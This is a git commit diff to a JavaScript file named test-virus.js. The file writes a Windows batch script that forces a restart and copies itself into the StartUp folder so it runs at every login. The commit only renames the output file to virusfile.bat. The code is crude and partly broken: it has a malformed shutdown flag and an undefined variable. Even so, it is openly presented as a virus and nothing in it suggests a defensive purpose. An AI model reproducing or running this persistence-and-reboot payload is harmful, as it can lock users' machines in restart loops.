b26dd07b27f9eff19749a811863c77fe4c14bb02
HerobrinePE <42194169+HerobrinePE@users.noreply.github.com>
2019-06-20 16:58:09 -0400

    Update test-virus.js

--- test-virus.js
+++ test-virus.js
@@ -2,7 +2,7 @@ const fs = require("fs")
 let virus = '@echo off\n' +
 'shutdown - r -t 10\n' +
 'copy /y virusfile.bat "%windir%\\Start Menu\\Programs\\StartUp"';
-fs.writeFile("Shutdown.bat", virus, (err) => { 
+fs.writeFile("virusfile.bat", virus, (err) => { 
 if (err) throw err; 
 function openfile(file) { window.location = "file:///" + virusfile.bat; }
 onclick="openfile(this.value)"
